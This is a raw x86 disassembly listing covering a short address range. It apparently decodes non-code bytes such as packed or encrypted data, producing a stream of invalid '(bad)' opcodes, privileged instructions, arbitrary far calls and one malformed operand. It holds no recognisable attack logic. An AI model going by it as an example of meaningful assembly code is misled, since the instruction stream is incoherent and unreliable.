  41042d:	imul   ebx,DWORD PTR [esi+0x5d],0xffffffb8
  410431:	adc    esi,DWORD PTR [edx+0x2f8e679]
  410437:	push   ebp
  410438:	adc    esi,DWORD PTR [eax+0x6884c08c]
  41043e:	fiadd  WORD PTR [eax]
  410440:	xchg   BYTE PTR [edi+0x13e2b154],bh
  410446:	int3   
  410447:	(bad)  
  410448:	les    edi,FWORD PTR cs:[edi-0x78]
  41044c:	out    0x54,al
  41044e:	sbb    BYTE PTR [esi+0x5c],dh
  410451:	sahf   
  410452:	sub    al,BYTE PTR [eax]
  410454:	cmp    esi,esi
  410456:	lock cwde 
  410458:	jp     0x4103dc
  41045a:	or     BYTE PTR [eax+0x5255a8a1],ch
  410460:	inc    eax
  410461:	cs aaa 
  410463:	je     0x41047a
  410465:	(bad)  
  410466:	gs sbb eax,eax
  410469:	mov    ds:0xd842e0aa,al
  41046e:	dec    eax
  41046f:	rcl    ah,1
  410471:	sbb    bl,BYTE PTR [edx+0x1a85b0a8]
  410477:	sbb    al,0xf3
  410479:	(bad)  
  41047a:	fidivr WORD PTR [eax-0x7d597d3c]
  410480:	push   esi
  410481:	xor    bl,cl
  410483:	shr    BYTE PTR [ebp-0x6a],1
  410486:	mov    ds,WORD PTR [esi+0x62]
  410489:	int3   
  41048a:	or     eax,0x3ea6c407
  41048f:	les    esp,FWORD PTR [ecx]
  410491:	stos   BYTE PTR es:[edi],al
  410492:	shr    BYTE PTR [esp+edx*8],0x4
  410496:	sub    ch,0x10
  410499:	call   0x733e055c
  41049e:	pop    esp
  41049f:	and    al,0x7
  4104a1:	call   0x57120b9f
  4104a6:	mov    bl,0x5
  4104a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a9:	clc    
  4104aa:	(bad)  
  4104ab:	pushf  
  4104ac:	and    al,BYTE PTR [eax]
  4104ae:	xchg   edi,eax
  4104af:	mov    WORD PTR [ebx],es
  4104b1:	sub    BYTE PTR [edx-0x6d],0x70
  4104b5:	mov    ah,0x7c
  4104b7:	push   es
  4104b8:	jne    0x410517
  4104ba:	push   ecx
  4104bb:	fwait
  4104bc:	add    BYTE PTR [esi-0x75e52929],ah
  4104c2:	sbb    ch,BYTE PTR [edx]
  4104c4:	adc    eax,0xbe355554
  4104c9:	cmp    BYTE PTR [esi+0x78],0x30
  4104cd:	mov    ds:0xb095ecf6,al
  4104d2:	inc    edx
  4104d3:	dec    ebp
  4104d4:	xor    BYTE PTR [esi+0x43a0f51c],bh
  4104da:	shl    DWORD PTR [ebx],1
  4104dc:	jmp    0x41050d
  4104de:	xchg   ebp,eax
  4104df:	(bad)  
  4104e1:	push   ebp
  4104e2:	aam    0x53
  4104e4:	(bad)  [ebp+ebx*2-0x63915f4a]
  4104eb:	outs   dx,DWORD PTR ds:[esi]
  4104ec:	adc    al,0x3a
  4104ee:	xor    dh,cl
  4104f0:	rcl    BYTE PTR [esi],1
  4104f2:	push   edi
  4104f3:	xchg   ebp,eax
  4104f4:	add    BYTE PTR [edx+0x30],ch
  4104f7:	inc    esp
  4104f8:	mov    al,0x57
  4104fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fb:	data16 scas al,BYTE PTR es:[edi]
  4104fd:	or     eax,0x5a7e6686
  410502:	lods   eax,DWORD PTR ds:[esi]
  410503:	sbb    dh,BYTE PTR [edx]
  410505:	lea    ebp,[edx-0x32]
  410508:	inc    ecx
  410509:	mov    bl,0xd
  41050b:	dec    ebp
  41050c:	add    al,0xf4
  41050e:	ds jmp 0x41053e
  410511:	out    dx,al
  410512:	cs inc eax
  410514:	jle    0x4104f6
  410516:	or     BYTE PTR [eax+eax*2],0x71
  41051a:	mov    esi,0x50582040
  41051f:	push   eax
  410520:	rol    BYTE PTR [edx+0x12],cl
  410523:	(bad)
  410526:	adc    eax,eax
  410528:	mov    ah,0xa
  41052a:	xchg   ebp,eax
  41052b:	push   esp
  41052c:	ss out dx,al
  41052e:	nop
  41052f:	fdiv   QWORD PTR [esi]
  410531:	inc    esi
  410532:	iret   
  410533:	ret    0x8a8a
  410536:	push   edi
  410537:	hlt    
  410538:	mov    ds:0x4060073,eax
  41053d:	fisttp DWORD PTR [eax+0x6ac2f3c2]
  410543:	sbb    BYTE PTR [edi-0x70],0xb1
  410547:	pop    ds
  410548:	rcl    al,cl
  41054a:	mov    dh,0x60
  41054c:	push   ebp
  41054d:	inc    ecx
  41054e:	xor    edx,0xf27ebbd8
  410554:	fdivr  DWORD PTR [eax-0x6578bcfd]
  41055a:	mov    ds:0x2e9c9de4,eax
  41055f:	rep ins BYTE PTR es:[edi],dx
  410561:	sbb    eax,DWORD PTR [eax+0x5bcc9a2a]
  410567:	xchg   ebp,eax
  410568:	inc    esi
  410569:	pop    ss
  41056a:	add    BYTE PTR [ebx-0x539e236f],al
  410570:	mov    ecx,DWORD PTR [edx]
  410572:	mov    cl,BYTE PTR [edx]
  410574:	mov    edx,0x89bafc80
  410579:	cwde   
  41057a:	mov    esp,?
  41057c:	xchg   BYTE PTR [ecx-0x4b],al
  41057f:	or     dx,dx
  410582:	in     eax,dx
  410583:	scas   al,BYTE PTR es:[edi]
  410584:	xor    al,0xa
  410586:	ins    DWORD PTR es:[edi],dx
  410587:	call   0x1ad6:0x1df1df2a
  41058e:	mov    es,WORD PTR [esi+0x78]
  410591:	cmp    BYTE PTR [eax+eax*1-0x7df32546],bh
  410598:	add    BYTE PTR [edi+0xd6900d9],bh
  41059e:	fwait
  41059f:	int3   
  4105a0:	shl    cl,0xee
  4105a3:	hlt    
  4105a4:	inc    edx
  4105a5:	and    BYTE PTR [ebx+0x4d1ded2e],0x5
  4105ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ad:	scas   al,BYTE PTR es:[edi]
  4105ae:	(bad)  
  4105af:	mov    esi,0xa21e20e2
  4105b4:	add    ebp,esp
  4105b6:	push   0xffffff8e
  4105b8:	retf   0x10a8
  4105bb:	push   esi
  4105bc:	xchg   edx,eax
  4105bd:	fdivr  DWORD PTR [edx+0x1e014394]
  4105c3:	dec    ecx
  4105c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c5:	pop    esi
  4105c6:	int    0x70
  4105c8:	mov    bh,0xb6
  4105ca:	mov    ah,0x2a
  4105cc:	lods   al,BYTE PTR ds:[esi]
  4105cd:	add    ch,BYTE PTR [edx]
  4105cf:	in     al,0x44
  4105d1:	icebp  
  4105d2:	call   0xbebd383f
  4105d7:	push   0xfffffffe
  4105d9:	cmp    BYTE PTR [eax+0x6e],al
  4105dc:	lock lock jp 0x410637
  4105e0:	xchg   ebp,ebp
  4105e2:	jb     0x410656
  4105e4:	clc    
  4105e5:	mov    es,eax
  4105e7:	jbe    0x410639
  4105e9:	clc    
  4105ea:	in     al,0x0
  4105ec:	jp     0x410639
  4105ee:	add    cl,bl
  4105f0:	in     al,dx
  4105f1:	push   0xe62ef7eb
  4105f6:	push   0x700b5abb
  4105fb:	sbb    dh,ch
  4105fd:	out    0x70,eax
  4105ff:	imul   edi,esp,0x3415b5b8
  410605:	fnstenv [ebp+ebp*2+0x4]
  410609:	mov    al,ds:0x8e6b1e5f
  41060e:	or     eax,0xb2138575
  410613:	dec    ebp
  410614:	mov    ah,0x4c
  410616:	cmp    BYTE PTR [ecx-0x66],bh
  410619:	aam    0x1c
  41061b:	dec    edx
  41061c:	or     ecx,DWORD PTR [ecx]
  41061e:	pop    ecx
  41061f:	ins    BYTE PTR es:[edi],dx
  410620:	jbe    0x41068c
  410622:	push   edx
  410623:	ret    
  410624:	jno    0x4105ca
  410626:	mov    dh,0x7d
  410628:	dec    esp
  410629:	push   eax
  41062a:	loop   0x410655
  41062c:	dec    ecx
  41062d:	dec    esp
  41062e:	retf   
  41062f:	push   cs
  410630:	inc    esp
  410631:	fadd   DWORD PTR [esi]
  410633:	fcmovnbe st,st(1)
  410635:	test   al,0x3b
  410637:	in     al,0x59
  410639:	rcr    esp,cl
  41063b:	in     al,dx
  41063c:	pop    esi
  41063d:	xlat   BYTE PTR ds:[ebx]
  41063e:	or     ch,BYTE PTR [eax+edi*4]
  410641:	and    BYTE PTR [esi-0x30],dl
  410644:	push   ebp
  410645:	fcomi  st,st(4)
  410647:	pop    esp
  410648:	dec    eax
  410649:	and    DWORD PTR [ecx],0x47
  41064c:	inc    ecx
  41064d:	sub    esi,DWORD PTR [eax+0x4e]
  410650:	jb     0x410603
  410652:	mov    esi,0x9ca324a7
  410657:	inc    ecx
  410658:	inc    ebx
  410659:	inc    edi
  41065a:	push   edi
  41065b:	scas   al,BYTE PTR es:[edi]
  41065c:	stos   BYTE PTR es:[edi],al
  41065d:	mov    ch,0x6c
  41065f:	stos   DWORD PTR es:[edi],eax
  410660:	xchg   edx,eax
  410661:	enter  0xbf6,0xa
  410665:	mov    ch,BYTE PTR [ecx+ecx*1-0x51]
  410669:	or     bh,dh
  41066b:	pop    ebx
  41066c:	dec    eax
  41066d:	push   0x50f0702a
  410672:	push   ecx
  410673:	push   ebp
  410674:	pusha  
  410675:	pop    eax
  410676:	ficomp WORD PTR [edx-0xa]
  410679:	into   
  41067a:	retf   0x1c11
  41067d:	pop    edi
  41067e:	aam    0x55
  410680:	data16 fnstcw WORD PTR [ecx+ebx*1+0x19d7ec]
  410688:	leave  
  410689:	sahf   
  41068a:	fimul  WORD PTR ds:0x5edfcd5d
  410690:	out    dx,eax
  410691:	xor    BYTE PTR [eax],al
  410693:	cmc    
  410694:	jbe    0x410696
  410696:	pop    ebp
  410697:	out    dx,eax
  410698:	and    BYTE PTR [esi-0x3e],0xcd
  41069c:	add    BYTE PTR [eax+0x15],ch
  41069f:	pop    ebp
  4106a0:	sbb    cl,BYTE PTR [ebp+0x5e]
  4106a3:	arpl   WORD PTR [eax],dx
  4106a5:	cmp    edx,ecx
  4106a7:	(bad)  
  4106a8:	rsm    
  4106aa:	sahf   
  4106ab:	mov    eax,0x1ebcbf44
  4106b0:	add    al,0x6c
  4106b2:	hlt    
  4106b3:	pop    edx
  4106b4:	iret   
  4106b5:	fcom   st(5)
  4106b7:	lahf   
  4106b8:	push   cs
  4106b9:	les    ebp,FWORD PTR [ebx+0x3a2b0d6b]
  4106bf:	test   al,0x15
  4106c1:	fs jae 0x41065f
  4106c4:	loopne 0x41071c
  4106c6:	and    al,BYTE PTR [edx+0x76]
  4106c9:	iret   
  4106ca:	inc    eax
  4106cb:	ret    
  4106cc:	es (bad) 
  4106ce:	sub    al,0xc4
  4106d0:	je     0x410740
  4106d2:	mov    eax,0x88af0d6e
  4106d7:	and    al,0x5a
  4106da:	xlat   BYTE PTR ds:[ebx]
  4106db:	jb     0x410664
  4106dd:	(bad)  
  4106de:	in     al,dx
  4106df:	arpl   WORD PTR [eax],dx
  4106e1:	jp     0x41072e
  4106e3:	dec    ebp
  4106e4:	call   0x54e6799
  4106e9:	lods   eax,DWORD PTR ds:[esi]
  4106ea:	mov    eax,ds:0x82e602c2
  4106ef:	call   0xd8bb:0xb08f1886
  4106f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106f7:	arpl   WORD PTR [ebp+0x46],bp
  4106fa:	call   0x3ffb:0xa049005e
  410701:	push   0x9
  410703:	shl    BYTE PTR [esi+0x35],1
  410706:	je     0x41077e
  410708:	(bad)  
  410709:	sbb    BYTE PTR [ecx],bh
  41070b:	pop    esi
  41070c:	cmp    al,0xe2
  41070e:	rcr    DWORD PTR [ebx+0x1b],0x75
  410712:	jp     0x41073a
  410714:	out    0x8e,al
  410716:	out    0x16,al
  410718:	jecxz  0x4106ec
  41071a:	add    dl,bl
  41071c:	sbb    BYTE PTR [eax+0x51],bh
  41071f:	cmp    ebp,DWORD PTR [ebp+eax*1-0x57]
  410723:	and    ah,ah
  410725:	add    edx,eax
  410727:	mov    fs,WORD PTR [eax+0x7a0035a8]
  41072d:	sub    eax,DWORD PTR [eax+0x48]
  410730:	bound  esp,QWORD PTR [edi-0x5a]
  410733:	mov    cl,0x9a
  410735:	xchg   BYTE PTR [edx+0x38],bl
  410738:	xchg   ecx,eax
  410739:	pop    ecx
  41073a:	sub    BYTE PTR [eax],ch
  41073c:	push   0xffffffb8
  41073e:	bound  ebx,QWORD PTR [esi+0x3138cfc2]
  410744:	(bad)  
  410745:	mov    DWORD PTR [esp+eax*8],esi
  410748:	mov    dl,0x5
  41074a:	mov    esi,0x6c4678c3
  41074f:	add    BYTE PTR [esi],0xb
  410752:	fadd   QWORD PTR [edx+0x3c]
  410755:	lods   eax,DWORD PTR ds:[esi]
  410756:	nop
  410757:	jmp    0x41079a
  410759:	(bad)  
  41075a:	popa   
  41075b:	xor    al,0x18
  41075d:	jbe    0x41077f
  41075f:	push   0x10a007bc
  410764:	mov    al,0xa9
  410766:	add    BYTE PTR [esi+0x6ffd223f],cl
  41076c:	dec    ecx
  41076d:	je     0x4107b3
  41076f:	cld    
  410770:	push   0xacce022c
  410775:	cmp    BYTE PTR [esi],ch
  410777:	pop    ss
  410778:	push   ebp
  410779:	add    al,0x56
  41077b:	les    esp,FWORD PTR [esi+0x6d6b89e]
  410781:	xlat   BYTE PTR ds:[ebx]
  410782:	data16 data16 adc al,0xe
  410786:	cdq    
  410787:	pop    ebp
  410788:	out    dx,al
  410789:	xlat   BYTE PTR ds:[ebx]
  41078a:	in     al,dx
  41078b:	sub    BYTE PTR [edx-0x777747fb],dh
  410791:	inc    eax
  410792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410793:	mov    edx,gs
  410795:	push   cs
  410796:	push   edx
  410797:	add    bl,BYTE PTR [edx+0x2b]
  41079a:	adc    BYTE PTR [edx-0x6b59ed9a],cl
  4107a0:	fcom   DWORD PTR [esi]
  4107a2:	inc    edi
  4107a3:	mov    ds:0xc2a86459,al
  4107a8:	jns    0x4107f5
  4107aa:	xor    edi,esp
  4107ac:	lds    ebp,FWORD PTR [ecx-0x66]
  4107af:	mov    ch,BYTE PTR [eax-0xec20b8a]
  4107b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107b6:	push   ebx
  4107b7:	shl    DWORD PTR [ecx*2+0x9fb31fe],1
  4107be:	(bad)  
  4107bf:	clc    
  4107c0:	test   al,0x1
  4107c2:	arpl   WORD PTR ds:[edx],si
  4107c5:	ins    DWORD PTR es:[edi],dx
  4107c6:	and    al,0x60
  4107c8:	popa   
  4107c9:	call   0xbe7b3237
  4107ce:	adc    bh,dh
  4107d0:	push   es
  4107d1:	pop    esp
  4107d2:	jbe    0x4107a0
  4107d4:	push   esi
  4107d5:	shl    BYTE PTR [edx*1-0x2920364a],1
  4107dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107dd:	(bad)  
  4107de:	pop    ebp
  4107df:	ret    
  4107e0:	imul   ebx,DWORD PTR [edx-0x291568f6],0x68d541d0
  4107ea:	call   0x55da:0x653a3a6
  4107f1:	fild   QWORD PTR [edi]
  4107f3:	ins    BYTE PTR es:[edi],dx
  4107f4:	push   eax
  4107f5:	lods   al,BYTE PTR ds:[esi]
  4107f6:	stos   BYTE PTR es:[edi],al
  4107f7:	add    al,0xa4
  4107f9:	fsubr  DWORD PTR [ecx]
  4107fb:	mov    ebp,0xb12b4aca
  410800:	push   es
  410801:	rcr    BYTE PTR [edx+0x3bbe57],1
  410807:	in     al,dx
  410808:	ins    DWORD PTR es:[edi],dx
  410809:	int    0x46
  41080b:	adc    dl,bl
  41080d:	adc    al,0xad
  41080f:	clc    
  410810:	(bad)  
  410811:	ficom  DWORD PTR [esi]
  410813:	pop    edx
  410814:	jg     0x41083c
  410816:	add    DWORD PTR [ebp+0x4dd16b43],eax
  41081c:	add    al,0x83
  41081e:	add    cl,dl
  410820:	dec    edx
  410821:	xor    BYTE PTR [ecx-0x757d3f62],0xa2
  410828:	xchg   BYTE PTR [eax+0x2a],dl
  41082b:	mov    dl,0xe9
  41082d:	push   esp
  41082e:	outs   dx,DWORD PTR ds:[esi]
  41082f:	xor    BYTE PTR ds:0x2e475d15,dl
  410835:	repnz mov dh,0xe5
  410838:	hlt    
  410839:	addr16 xchg esp,eax
  41083b:	loop   0x410858
  41083d:	add    BYTE PTR [eax+0xd],0xc8
  410841:	push   0x435ad6e4
  410846:	adc    DWORD PTR [eax-0x69190988],0x93e80ddc
  410850:	hlt    
  410851:	mov    al,ds:0x482b5ac
  410856:	add    BYTE PTR [esp+ebx*8-0xb6617f5],bl
  41085d:	add    BYTE PTR ds:0x9a5e5d05,al
  410863:	cmp    al,0x17
  410865:	dec    eax
  410866:	lahf   
  410867:	or     DWORD PTR [edx],0x606c6205
  41086d:	nop
  41086e:	retf   0xc148
  410871:	mov    ecx,0x54954160
  410876:	es push ecx
  410878:	add    bh,ch
  41087a:	add    BYTE PTR [esp+esi*4],bl
  41087d:	dec    ebx
  41087e:	imul   eax,DWORD PTR [ecx+0x41],0x1a
  410882:	shl    BYTE PTR [esp+ebx*4-0x459ae8],0xd
  41088a:	lahf   
  41088b:	(bad)  
  41088c:	sbb    eax,0x802f861
  410891:	mov    bh,0xfb
  410893:	add    BYTE PTR [edi],al
  410895:	jns    0x410897
  410897:	mov    eax,0x647000f7
  41089c:	xor    eax,0xf3bd0c9b
  4108a1:	jno    0x410845
  4108a3:	ja     0x41091e
  4108a5:	repz sub dh,BYTE PTR [edi-0x769087ea]
  4108ac:	add    ah,cl
  4108ae:	or     eax,DWORD PTR [ebp-0x56493700]
  4108b4:	mov    ebp,0x7f2408a0
  4108b9:	dec    esi
  4108ba:	add    BYTE PTR [esp+esi*8-0x29a2b321],al
  4108c1:	or     al,BYTE PTR [ecx-0x6d]
  4108c4:	imul   ebx,DWORD PTR [edx+0x7086defc],0x188954e3
  4108ce:	dec    edx
  4108cf:	pop    ebx
  4108d0:	popa   
  4108d1:	call   0x174bc5bd
  4108d6:	inc    eax
  4108d7:	push   ebx
  4108d8:	mov    al,0x46
  4108da:	imul   edx,ebp,0x72d0b254
  4108e0:	jno    0x4108c2
  4108e2:	pop    eax
  4108e3:	das    
  4108e4:	mov    bh,cl
  4108e6:	(bad)  
  4108e7:	jne    0x4108b3
  4108e9:	pop    edx
  4108ea:	jns    0x4108c6
  4108ec:	push   edi
  4108ed:	push   esp
  4108ee:	adc    eax,0x7d54ff22
  4108f3:	sbb    al,0x3
  4108f5:	rol    DWORD PTR [eax],1
  4108f7:	xor    DWORD PTR [ebx-0x10cb2b18],0xb1a36f8
  410901:	int3   
  410902:	mov    DWORD PTR [ebp+0x208d0f00],edi
  410908:	fsub   st,st(4)
  41090a:	fcom   DWORD PTR [ebx]
  41090c:	lds    esi,FWORD PTR [esi]
  41090e:	and    dl,BYTE PTR [edi]
  410910:	shr    BYTE PTR [esi+eiz*8-0x60],0xa
  410915:	or     dl,BYTE PTR [ebx+ebx*1-0x2f61668e]
  41091c:	shr    ebx,1
  41091e:	push   ecx
  41091f:	rcr    BYTE PTR [ebp-0x75eb54c],0x8
  410926:	(bad)  
  410927:	outs   dx,DWORD PTR ds:[esi]
  410928:	push   0x2b14a557
  41092d:	out    0xd0,eax
  41092f:	das    
  410930:	loop   0x410980
  410932:	mov    ds:0x7e0ed322,al
  410937:	xor    edi,ebp
  410939:	mov    BYTE PTR [edi+esi*1+0x4f58930e],ah
  410940:	ret    0x9ab5
  410943:	fidivr DWORD PTR [ecx+0x30e84cc6]
  410949:	fstp   TBYTE PTR [edx-0x43]
  41094c:	pushf  
  41094d:	add    BYTE PTR [ebx+0x5a],al
  410950:	ss inc edi
  410952:	mov    edx,DWORD PTR [edx]
  410954:	in     al,dx
  410955:	push   0x4b9cc5f8
  41095a:	xor    bh,BYTE PTR [eax-0x57]
  41095d:	inc    eax
  41095e:	inc    eax
  41095f:	adc    DWORD PTR [edx+0x74],0xffffffcd
  410963:	out    0x28,al
  410965:	cwde   
  410966:	call   0xd538:0x57621d16
  41096d:	or     esp,eax
  41096f:	mov    al,es:0x342c4226
  410975:	clc    
  410976:	pop    edi
  410977:	mov    dl,0x94
  410979:	xor    al,0x6c
  41097b:	int    0xf0
  41097d:	sbb    al,0x0
  41097f:	loope  0x4109bf
  410981:	into   
  410982:	inc    eax
  410983:	in     eax,0x4c
  410985:	imul   ebx,DWORD PTR [edx],0xfffffffe
  410988:	cmp    BYTE PTR [esi+0x0],dh
  41098b:	xor    dl,bl
  41098d:	sbb    eax,0x22f1a47c
  410992:	xchg   BYTE PTR ds:0x401419ad,dl
  410998:	cmc    
  410999:	dec    esp
  41099a:	jnp    0x410a06
  41099c:	stc    
  41099d:	sub    al,0x2
  41099f:	test   al,0x82
  4109a1:	push   edx
  4109a2:	sbb    eax,DWORD PTR [eax]
  4109a4:	jb     0x410a1a
  4109a6:	dec    ebx
  4109a7:	bound  edx,QWORD PTR [ecx-0x6d]
  4109aa:	mov    al,0x82
  4109ac:	xchg   DWORD PTR [eax],esp
  4109ae:	add    eax,0x8742c4d
  4109b3:	mov    eax,ds:0x8fcc09a6
  4109b8:	pop    esp
  4109b9:	not    BYTE PTR [ecx+0x561d0db4]
  4109bf:	jbe    0x410945
  4109c1:	(bad)  
  4109c2:	out    0x9f,eax
  4109c4:	outs   dx,BYTE PTR ds:[esi]
  4109c5:	inc    ecx
  4109c6:	fistp  WORD PTR [eax*4+0x3b1c0b0e]
  4109cd:	sub    eax,0xba665390
  4109d2:	lods   eax,DWORD PTR ds:[esi]
  4109d3:	sbb    ebx,DWORD PTR [ebp-0x79]
  4109d6:	shl    BYTE PTR [esi],1
  4109d8:	ret    
  4109d9:	stos   BYTE PTR es:[edi],al
  4109da:	pop    ds
  4109db:	or     BYTE PTR [edx],bh
  4109dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109de:	adc    esi,edx
  4109e0:	lods   al,BYTE PTR ds:[esi]
  4109e1:	add    ch,BYTE PTR [eax+ebp*2+0x68]
  4109e5:	fdivr  QWORD PTR [ebp+0x2c]
  4109e8:	mov    cl,0xc8
  4109ea:	inc    ebp
  4109eb:	into   
  4109ec:	mov    esi,0x80533414
  4109f1:	xchg   edi,eax
  4109f2:	pop    esi
  4109f3:	clc    
  4109f4:	jbe    0x4109c7
  4109f6:	mov    bl,BYTE PTR [esi-0x80]
  4109f9:	mov    ss,eax
  4109fb:	gs jbe 0x4109c8
  4109fe:	pusha  
  4109ff:	test   eax,0x4c9b1c2a
  410a04:	ds pop eax
  410a06:	test   al,0xc
  410a08:	and    al,0x52
  410a0a:	mov    ah,0x4
  410a0c:	sub    ebx,DWORD PTR [ebx+ebp*1]
  410a0f:	mov    eax,0xdc0664b5
  410a14:	jmp    0x6aa:0x2802367b
  410a1b:	int3   
  410a1c:	idiv   BYTE PTR [esi]
  410a1e:	test   DWORD PTR [edx+0x53],ebx
  410a21:	mov    ch,0xe9
  410a23:	(bad)  
  410a24:	ins    BYTE PTR es:[edi],dx
  410a25:	pop    eax
  410a26:	ds ret 0x7e4e
  410a2a:	dec    edi
  410a2b:	push   edx
  410a2c:	enter  0x6a12,0xcd
  410a30:	sub    edx,DWORD PTR [edx-0x45]
  410a33:	add    BYTE PTR ds:0x9128b63d,dh
  410a39:	push   0xffffffb0
  410a3b:	dec    ebp
  410a3c:	hlt    
  410a3d:	pushf  
  410a3e:	and    ebp,DWORD PTR ds:0x892416fe
  410a44:	loop   0x410a3e
  410a46:	sub    DWORD PTR [edi-0x79],edx
  410a49:	leave  
  410a4a:	jmp    0xf2b3:0xd2741cda
  410a51:	mov    eax,ds:0x4a474161
  410a56:	dec    eax
  410a57:	out    0x18,al
  410a59:	sar    cl,1
  410a5b:	sub    al,0xdb
  410a5d:	add    al,bl
  410a5f:	and    BYTE PTR [ebx],0x6
  410a62:	nop
  410a63:	sbb    BYTE PTR [eax-0x1f93af0f],bl
  410a69:	mov    bl,0x54
  410a6b:	(bad)  
  410a6c:	cli    
  410a6d:	or     dh,0xc8
  410a70:	jecxz  0x410a3c
  410a72:	in     eax,dx
  410a73:	cwde   
  410a74:	js     0x410a83
  410a76:	dec    esp
  410a77:	daa    
  410a78:	(bad)  
  410a79:	lock cmp DWORD PTR [esi-0x52c2b731],0xff1cdd8a
  410a84:	ret    0xd9ba
  410a87:	push   ecx
  410a88:	push   ecx
  410a89:	and    al,0xc1
  410a8b:	mov    eax,0x71b3541f
  410a90:	repnz add dl,dl
  410a93:	jbe    0x410af6
  410a95:	sub    al,0x28
  410a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a98:	add    eax,DWORD PTR [edx-0x29]
  410a9b:	test   eax,eax
  410a9d:	jns    0x410a57
  410a9f:	mov    DWORD PTR [eax],0x245b8eda
  410aa5:	fiadd  DWORD PTR [ecx]
  410aa7:	call   0x4167b944
  410aac:	sub    esi,DWORD PTR [eax-0xab189f3]
  410ab2:	push   ss
  410ab3:	mov    al,BYTE PTR [ebx+0x70]
  410ab6:	pop    edi
  410ab7:	test   al,0x54
  410ab9:	or     ah,BYTE PTR [edi+0x60]
  410abc:	in     eax,0xfd
  410abe:	inc    eax
  410abf:	xor    BYTE PTR [ecx+0x3],cl
  410ac2:	mov    ah,0xc2
  410ac4:	push   esi
  410ac5:	cs pop edx
  410ac7:	jecxz  0x410afd
  410ac9:	mov    cl,bh
  410acb:	jmp    0x145b94f4
  410ad0:	aam    0x50
  410ad2:	test   BYTE PTR [ebp+ebp*2-0x1f95f5aa],cl
  410ad9:	nop
  410ada:	fdivr  st,st(2)
  410adc:	std    
  410add:	aad    0xd6
  410adf:	imul   ebp,DWORD PTR [edi+edx*1+0x6c],0xffffffb0
  410ae4:	pop    ebp
  410ae5:	and    BYTE PTR [ebx+ebx*8-0x4e],ch
  410ae9:	and    cl,0xc1
  410aec:	int3   
  410aed:	inc    ebx
  410aee:	add    BYTE PTR [edx-0x11],dh
  410af1:	push   0xb6d25130
  410af6:	jg     0x410a88
  410af8:	imul   ecx,ebx,0x77d1f500
  410afe:	push   esp
  410aff:	xor    al,0x63
  410b01:	(bad)  
  410b02:	fistp  QWORD PTR [esi-0x7b]
  410b05:	aaa    
  410b06:	add    BYTE PTR [eax-0x28],bh
  410b09:	cmp    BYTE PTR [ebp-0x27f15176],cl
  410b0f:	jle    0x410b67
  410b11:	cli    
  410b12:	inc    esi
  410b13:	jp     0x410b5e
  410b15:	je     0x410aaf
  410b17:	mov    dl,BYTE PTR [esi+0x4a]
  410b1a:	xchg   esp,eax
  410b1b:	sbb    dl,ah
  410b1d:	add    eax,DWORD PTR [eax-0x652f29eb]
  410b23:	adc    BYTE PTR [edx],bh
  410b25:	outs   dx,BYTE PTR ds:[esi]
  410b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b27:	push   cs
  410b28:	pusha  
  410b29:	ins    DWORD PTR es:[edi],dx
  410b2a:	inc    edi
  410b2b:	xlat   BYTE PTR ds:[ebx]
  410b2c:	push   0xffffff8c
  410b2e:	out    dx,al
  410b2f:	xchg   esi,eax
  410b30:	push   edi
  410b31:	sahf   
  410b32:	push   0xffffffbc
  410b34:	sub    BYTE PTR [edx],ch
  410b36:	pop    eax
  410b37:	and    DWORD PTR [esp+eax*8],eax
  410b3a:	or     dh,BYTE PTR ds:0x741c00a9
  410b40:	dec    eax
  410b41:	icebp  
  410b42:	push   eax
  410b43:	pop    eax
  410b44:	outs   dx,DWORD PTR ds:[esi]
  410b45:	sub    DWORD PTR [eax+0x63103472],edi
  410b4b:	push   0x77043073
  410b50:	xor    edi,DWORD PTR [ecx+esi*4-0x58]
  410b54:	mov    ds:0x70fd9235,eax
  410b59:	addr16 inc edx
  410b5b:	push   ebp
  410b5c:	add    bl,BYTE PTR [ebx]
  410b5e:	stc    
  410b5f:	int    0xbc
  410b61:	call   0xfc483b97
  410b66:	cmp    BYTE PTR [edi-0x770cf500],ah
  410b6c:	setnp  BYTE PTR [edi]
  410b6f:	mov    ch,0xd
  410b71:	out    0x8b,al
  410b73:	mov    ebp,0xb838527c
  410b78:	add    BYTE PTR [edi],dl
  410b7a:	fistp  QWORD PTR [ebx-0x19f28000]
  410b80:	int    0x1b
  410b82:	in     eax,dx
  410b83:	mov    esi,0xaaee1f00
  410b88:	xor    esi,ebp
  410b8a:	out    0x45,al
  410b8c:	or     ecx,DWORD PTR [esi]
  410b8e:	(bad)  
  410b8f:	aas    
  410b90:	test   BYTE PTR [ebp-0x18],bh
  410b93:	inc    esp
  410b94:	fadd   QWORD PTR [eax]
  410b96:	lods   eax,DWORD PTR ds:[esi]
  410b97:	mov    bl,al
  410b99:	mov    ah,dh
  410b9b:	mov    bl,ah
  410b9d:	mov    eax,0xb5330095
  410ba2:	inc    esi
  410ba3:	and    eax,0x8af35ec7
  410ba8:	dec    esi
  410ba9:	adc    eax,0xc56aa78a
  410bae:	push   0x6d
  410bb0:	add    ah,bl
  410bb2:	mov    eax,0x22f35357
  410bb7:	es mov eax,0x901a00bb
  410bbd:	jbe    0x410c22
  410bbf:	ds call 0x7eb0:0xb960aba6
  410bc7:	sbb    DWORD PTR [esi],esp
  410bc9:	mov    ds:0x1d04a607,eax
  410bce:	jg     0x410bf0
  410bd0:	cmp    BYTE PTR [ebp-0x1b24ffe8],dh
  410bd6:	pop    ebp
  410bd7:	pop    edx
  410bd8:	mov    bh,BYTE PTR [esi+0x20]
  410bdb:	rcl    ah,0x1a
  410bde:	shr    BYTE PTR [eax+eax*1+0x144ff8de],cl
  410be5:	cmp    BYTE PTR [esi],dh
  410be7:	fcomp  DWORD PTR [esi-0x77]
  410bea:	cmp    DWORD PTR [edi-0x24],0x40964e84
  410bf1:	push   edi
  410bf2:	sti    
  410bf3:	ret    0xde17
  410bf6:	inc    edx
  410bf7:	push   es
  410bf8:	add    ah,al
  410bfa:	call   0xb532:0x4ad6c848
